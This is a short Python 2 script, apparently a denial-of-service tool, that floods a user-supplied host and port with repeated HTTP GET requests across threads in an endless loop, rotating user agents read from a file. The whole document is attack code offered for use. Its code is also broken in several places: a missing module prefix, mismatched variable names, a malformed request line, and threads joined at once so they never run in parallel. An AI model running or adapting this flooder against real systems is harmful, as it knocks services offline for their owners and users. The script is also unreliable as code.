import threading
import socket
import random
import sys

global headers,UsAg,host,port

def UserAgent():
	UserAg=[]
	File=open("UserAgent.txt","r")
	for line in File:
		userAg.append(line)
	return userAg

def TakeDown(host="",port=80):
	try:
		sock = socket(socket.AF_INET,socket.SOCK_STREAM)
	except socket.error,msg:
		print "Error:",msg
	else:
		try:
			host=socket.gethostbyname(host)
		except socket.gaierror:
			print "Could not resolve Hostname"
			sys.exit()
		else:
			packet=str("GET /HTTP/1.1\nHost:"+host+"\n\nUser-Agent"+random.choice(UsAg)+"\n"+headers).encode('utf-8')
			if sock.connect_ex((host,port)) == 0:
				if sock.sendall(packet) ==None:
					print "Packet Send Successfuly!!!!!"
					sock.close()
				else:
					print "Error While Sending ??"
					sys.exit()

if __name__=="__main__":
	host = raw_input("Enter Host Address:")
	port = int(raw_input("Enter Port Number:"))
	threads = int(raw_input("Enter Number of Threads:"))
	UsAg =UserAgent()

	fp = open("Headaer.txt","r")
	headers=fp.read()
	fp.close()
	while True:
		for i in range(threads):
			th=threading.Thread(target=TakeDown,args=(host,port),name="User-"+str(1))
			th.Daemon=True
			th.start()
			th.join()

